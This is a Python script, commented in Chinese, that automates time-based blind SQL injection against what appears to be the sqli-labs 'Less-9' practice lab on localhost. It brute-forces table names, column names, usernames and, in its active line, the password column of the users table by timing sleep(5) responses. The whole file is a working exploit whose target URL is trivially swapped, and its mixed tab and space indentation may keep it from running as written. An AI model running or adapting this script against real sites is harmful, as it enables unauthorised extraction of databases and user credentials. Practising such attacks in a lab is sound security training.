#coding:utf-8
import requests
import time,datetime

char = "abcdefghijklmnopqrstuvwxyz0123456789~*/\{}?!:@_-"
num = 25;#预计数据库/表/字段名/字段的数量
namelen = 15;#预计名字的长度
print("start!")

for i in range(0,num):
    name = ""
    for j in range(1,namelen):
        for str in char:
            time1 = datetime.datetime.now()
	    #爆出表名select table_name from information_schema.tables where table_schema = database()
            #res = requests.get("http://localhost/sqli/Less-9/?id=1%%27and%%20if(mid((select%%20table_name%%20from%%20information_schema.tables%%20where%%20table_schema=database()%%20limit%%20%s,1),%s,1)=%%27%s%%27,sleep(5),0)--+"%(i,j,str))
            #爆出字段名select column_name from information_schema.columns where table_name='users'
            #res = requests.get("http://localhost/sqli/Less-9/?id=1%%27and%%20if(mid((select%%20column_name%%20from%%20information_schema.columns%%20where%%20table_name=%%27users%%27%%20limit%%20%s,1),%s,1)=%%27%s%%27,sleep(5),0)--+"%(i,j,str))
	    #爆出用户名字段值select username from users;
	    #res = requests.get("http://localhost/sqli/Less-9/?id=1%%27and%%20if(mid((select%%20username%%20from%%20users%%20limit%%20%s,1),%s,1)=%%27%s%%27,sleep(5),0)--+"%(i,j,str))
	    #爆出密码字段值
	    res = requests.get("http://localhost/sqli/Less-9/?id=1%%27and%%20if(mid((select%%20password%%20from%%20users%%20limit%%20%s,1),%s,1)=%%27%s%%27,sleep(5),0)--+"%(i,j,str))
	    time2 = datetime.datetime.now()
            sec = (time2 - time1).seconds
            if sec>2:
                name += str
                break
    if(name == ""):
	break
    print(name)

